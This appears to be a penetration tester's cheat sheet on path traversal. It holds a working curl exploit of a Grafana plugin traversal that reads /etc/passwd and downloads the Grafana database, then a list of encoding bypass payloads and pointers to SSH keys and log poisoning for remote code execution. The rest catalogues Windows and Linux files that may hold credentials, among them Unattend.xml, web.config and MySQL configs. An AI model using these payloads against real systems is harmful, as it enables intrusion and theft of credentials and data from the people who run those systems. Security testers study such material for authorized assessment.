
## Syntax

```
curl --path-as-is "http://192.168.130.181:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Saving into file locally.

```
curl --path-as-is "http://192.168.130.181:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
```

**Practical manual techniques to try**

- **Simple traversal:** start with `../../../../etc/passwd` — but don’t stop there.
- **Try variants like :** `..//..//..//etc/passwd` or `..\/..\/..\/etc/passwd.`
- This one is good too: ....//....//....//....//etc/passwd
- **Dot+slash permutations:** `..././../` or `..%2f..%2f..%2fetc/passwd` (URL encoded).
- **Try Double-encoding:** URL-encode twice if the app decodes input more than once (example: `%252e%252e%252f` = `%2e%2e%2f`).

Things u need to check to gain RCE

```
/etc/passwd
/.ssh/id_rsa
/var/log/apache2/access.log # for log poisoning RCE
```

---
## Windows

#### Paths to check

Hosts File

```
C:\Windows\System32\drivers\etc\hosts
```


Network Interfaces / Routing

```
C:\Windows\System32\drivers\etc\networks
```

System Version & Build Info:

```
C:\Windows\System32\license.rtf
C:\Windows\System32\eula.txt
```

Unattended Installation Files: (May contain setup configurations or administrator credentials from OS setup)

```
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep.inf
```

##### Web Server Configuration & Log Files

###### IIS (Internet Information Services)

Application Host Config

```
C:\Windows\System32\inetsrv\config\applicationHost.config
C:\Windows\System32\inetsrv\config\schema\NetFX40_Server_Schema.xml
```

Web Root Configurations

```
C:\inetpub\wwwroot\web.config
```

IIS Logs (Format: u_exYYMMDD.log in dated subfolders)

```
C:\inetpub\logs\LogFiles\W3SVC1\u_ex240101.log
```
###### Apache on Windows (XAMPP / WampServer)

Configuration

```
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\conf\extra\httpd-vhosts.conf
C:\wamp\bin\apache\apacheX.X.X\conf\httpd.conf
```

Logs

```
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
```

##### Nginx

###### Windows 

Configuration

```
C:\nginx\conf\nginx.conf
```

Logs

```
C:\nginx\logs\access.log
C:\nginx\logs\error.log
```

###### Linux

Config

```
/etc/nginx/sites-enabled/default
```

##### Database & Application Configurations

Application configuration files often contain database connection strings, API keys, or application settings:

PHP Settings

```
C:\php\php.ini
C:\Windows\php.ini
C:\xampp\php\php.ini
```

MySQL / MariaDB

```
C:\xampp\mysql\bin\my.ini
C:\ProgramData\MySQL\MySQL Server X.X\my.ini
```

ASP.NET Applications

```
C:\inetpub\wwwroot\web.config
```
